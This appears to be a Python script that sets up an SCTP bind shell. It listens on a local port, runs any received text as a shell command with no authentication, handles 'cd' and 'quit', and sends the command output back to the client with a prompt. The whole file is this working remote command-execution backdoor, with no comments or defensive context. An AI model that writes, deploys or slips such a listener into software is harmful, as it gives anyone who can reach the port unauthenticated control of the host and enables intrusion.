import socket
import os
import subprocess
import signal
import sys
import threading
import sctp


bind_ip = '127.0.0.1'
bind_port = 8880
serv_add = (bind_ip , bind_port )
server = sctp.sctpsocket(socket.AF_INET, sctp.UDP_STYLE, 0)

server.bind(serv_add)
server.listen(5)
print ("[*] listening on {}:{}".format(bind_ip,bind_port))


while True:

    fromaddr, flags, data, notif = server.sctp_recv(1024)

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
        output_bytes = cmd.stdout.read()
        output_str = str(output_bytes, "utf-8")
        server.sctp_send(str.encode(output_str + str(os.getcwd()) + '$'), fromaddr)
    if data[:4].decode("utf-8") == 'quit':
        break

server.close()